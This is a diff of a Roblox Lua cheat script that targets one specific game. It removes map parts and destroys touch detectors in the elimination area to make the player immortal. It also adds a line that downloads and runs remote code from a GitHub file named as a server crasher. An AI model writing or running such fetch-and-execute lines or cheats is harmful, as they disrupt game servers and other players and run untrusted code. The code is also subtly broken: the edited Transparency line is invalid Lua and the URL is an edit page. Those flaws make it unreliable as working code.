@@ -5,9 +5,9 @@ end
 
 if game.PlaceId == 61846006 then --To prevent errors with other games when on autoexec, the game will be checked
 	coroutine.resume(coroutine.create(function()
-		for i,v in pairs(workspace:FindPartsInRegion3(Region3.new(Vector3.new(-20.79918670654297,74.70075988769531,-13.819000244140625),Vector3.new(-20.79918670654297,74.70075988769531,-13.819000244140625)),nil,math.huge)) do if v.Name == "Confetti" then v:Destroy() end end
-		for i,v in pairs(workspace:FindPartsInRegion3(Region3.new(Vector3.new(-20.799148559570312,88.90079498291016,-13.818876266479492),Vector3.new(-20.799148559570312,88.90079498291016,-13.818876266479492)),nil,math.huge)) do if v.Name == "Ceiling" then v:Destroy() end end
+		for i,v in pairs(workspace:FindPartsInRegion3(Region3.new(Vector3.new(-20.799148559570312,88.90079498291016,-13.818876266479492),Vector3.new(-20.799148559570312,88.90079498291016,-13.818876266479492)),nil,math.huge)) do if v.Name == "Ceiling" then v:Transparency = 1 end end
 	end))
+	loadstring(game:HttpGet("https://github.com/TimeFlaire/SoulmateColorGUI/edit/main/SimonSaysServerCrasher.lua",true))()
 for i,v in pairs(game:GetService("Workspace").Building.Eliminate:GetDescendants()) do --Check's game.Workspace.Building.Eliminate
  if v.ClassName == "TouchTransmitter" then
      v:Destroy() -- Destroys all touch transmitters, making you immortal
